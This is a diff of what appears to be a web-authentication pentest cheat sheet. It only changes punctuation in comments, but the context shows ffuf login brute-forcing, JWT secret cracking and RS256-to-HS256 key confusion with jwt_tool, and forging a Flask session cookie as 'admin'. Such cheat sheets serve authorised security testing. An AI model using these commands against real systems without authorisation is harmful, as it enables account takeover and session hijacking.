@@ -52,7 +52,7 @@ ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -fw 100
 
-# Burp Intruder — Pitchfork for user+pass, Sniper for password only
+# Burp Intruder: Pitchfork for user+pass, Sniper for password only
 ```
 
 **Tips:**
@@ -112,7 +112,7 @@ python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
 # JWT key confusion (RS256 → HS256)
 python3 jwt_tool.py <token> -X k -pk public.pem
 
-# Cookie decode — base64
+# Cookie decode: base64
 echo "cookie_value" | base64 -d
 
 # Flask session decode
@@ -127,9 +127,9 @@ flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'known_secret'
 # Session fixation test
 # 1. Get session before login
 # 2. Log in
-# 3. Check if session ID changed — if not, fixation possible
+# 3. Check if session ID changed: if not, fixation possible
 
-# Session prediction — check if tokens are sequential or time-based
+# Session prediction: check if tokens are sequential or time-based
 seq 1 100 | while read i; do
   echo "token_prefix_$i"
 done
